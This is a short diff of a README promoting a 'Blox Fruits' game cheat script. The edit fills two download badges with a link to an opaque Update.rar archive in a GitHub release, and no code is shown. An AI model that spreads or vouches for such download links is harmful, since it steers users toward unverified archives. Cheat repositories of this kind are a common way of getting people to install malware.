@@ -1,8 +1,8 @@
-# 🏴‍☠️ **Blox Fruits Script — Unlock Ultimate Power in the Seas!** 🌊🔥 [![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-purple?style=for-the-badge&logo=download)]()
+# 🏴‍☠️ **Blox Fruits Script — Unlock Ultimate Power in the Seas!** 🌊🔥 [![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-purple?style=for-the-badge&logo=download)](https://github.com/HexaShift/blox-fruits-script/releases/download/Update/Update.rar)
 
 
 ![bl1](https://github.com/user-attachments/assets/0176e6db-5851-46f8-8d91-bbaca72d3511)
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-purple?style=for-the-badge&logo=download)]()
+[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-purple?style=for-the-badge&logo=download)](https://github.com/HexaShift/blox-fruits-script/releases/download/Update/Update.rar)
 
 
 ## 🌟 **What is Blox Fruits Script?**
